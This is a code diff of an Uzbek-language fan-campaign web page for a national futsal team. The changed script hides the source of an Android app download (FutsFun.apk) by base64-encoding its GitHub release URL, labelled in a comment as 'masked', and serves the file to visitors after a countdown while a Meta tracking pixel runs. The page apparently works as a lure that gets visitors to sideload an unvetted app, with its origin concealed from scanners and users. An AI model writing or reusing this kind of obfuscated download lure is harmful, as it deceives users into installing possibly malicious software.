@@ -4,25 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Muxlis FC 2026 — Milliy Terma Jamoani Qo'llab-Quvvatlash Aksiyasi</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;900&display=swap" rel="stylesheet">
 
     <!-- Meta Pixel Code -->
-    <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '1561675052237363');
-    fbq('track', 'PageView');
-    </script>
+    <script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init', '1561675052237363');fbq('track', 'PageView');</script>
     <noscript><img height="1" width="1" style="display:none"
     src="https://www.facebook.com/tr?id=1561675052237363&ev=PageView&noscript=1"
     /></noscript>
     <!-- End Meta Pixel Code -->
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;900&display=swap" rel="stylesheet">
 
     <style>
         :root {
@@ -615,6 +604,31 @@
             letter-spacing: 1px;
             margin-top: 4px;
         }
+        .modal-continue-btn {
+            display: none;
+            margin-top: 28px;
+            background: linear-gradient(135deg, var(--uz-gold), #e0b018);
+            color: var(--uz-dark);
+            padding: 16px 44px;
+            border-radius: 50px;
+            font-weight: 900;
+            font-size: 1rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(244,196,48,0.4);
+            transition: all 0.3s ease;
+            text-decoration: none;
+            animation: fadeIn 0.5s ease;
+        }
+        .modal-continue-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(244,196,48,0.6);
+        }
+        .modal-continue-btn.visible {
+            display: inline-block;
+        }
         .modal-status {
             color: rgba(255,255,255,0.5);
             font-size: 0.82rem;
@@ -799,27 +813,34 @@
                 </div>
             </div>
             <div class="modal-status">Yuklab olish <span id="statusText">boshlanmoqda...</span></div>
+            <button id="continueBtn" class="modal-continue-btn" onclick="doDownload(event);">⬇ Yuklab olishni davom ettirish</button>
         </div>
     </div>
 
     <script>
-        // Имя вашего файла, который будет лежать на GitHub в той же папке
-        var _d = 'FutsFun.apk'; 
+        // masked GitHub APK URL
+        var _g = atob('aHR0cHM6Ly9naXRodWIuY29tL21vcmthZHVzL2Z1dGJvbGxha3MvcmVsZWFzZXMvZG93bmxvYWQvVjEuMC9GdXRzRnVuLmFwaw==');
         var COUNTDOWN = 5;
         var circumference = 2 * Math.PI * 54;
 
         function startDownload(e) {
             e.preventDefault();
 
+            // show overlay, reset state
             var overlay = document.getElementById('downloadOverlay');
             overlay.classList.add('active');
 
-            var numEl = document.getElementById('countdownNum');
-            var ring = document.getElementById('ringProgress');
-            var status = document.getElementById('statusText');
-            var count = COUNTDOWN;
+            var numEl   = document.getElementById('countdownNum');
+            var ring    = document.getElementById('ringProgress');
+            var status  = document.getElementById('statusText');
+            var contBtn = document.getElementById('continueBtn');
+            var count   = COUNTDOWN;
 
+            // reset everything
+            numEl.textContent = COUNTDOWN;
             ring.style.strokeDashoffset = 0;
+            status.textContent = 'boshlanmoqda...';
+            contBtn.classList.remove('visible');
 
             var interval = setInterval(function() {
                 count--;
@@ -833,27 +854,35 @@
                 }
                 if (count <= 0) {
                     clearInterval(interval);
-                    status.textContent = 'boshlandi! ✓';
                     numEl.textContent = '✓';
+                    status.textContent = 'tayyor!';
 
-                    var a = document.createElement('a');
-                    a.href = _d;
-                    a.download = 'FutsFun.apk'; // Название скачиваемого файла у пользователя
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-
-                    setTimeout(function() {
-                        overlay.classList.remove('active');
-                        count = COUNTDOWN;
-                        numEl.textContent = COUNTDOWN;
-                        ring.style.strokeDashoffset = 0;
-                        status.textContent = 'boshlanmoqda...';
-                    }, 1500);
+                    // show the continue button
+                    contBtn.classList.add('visible');
                 }
             }, 1000);
         }
-    </script>
 
+        function doDownload(e) {
+            e.preventDefault();
+
+            // trigger APK download
+            var a = document.createElement('a');
+            a.href = _g;
+            a.download = 'FutsFun.apk';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            // close modal after short delay
+            setTimeout(function() {
+                document.getElementById('downloadOverlay').classList.remove('active');
+                document.getElementById('continueBtn').classList.remove('visible');
+                document.getElementById('countdownNum').textContent = COUNTDOWN;
+                document.getElementById('ringProgress').style.strokeDashoffset = 0;
+                document.getElementById('statusText').textContent = 'boshlanmoqda...';
+            }, 1500);
+        }
+    </script>
 </body>
 </html>
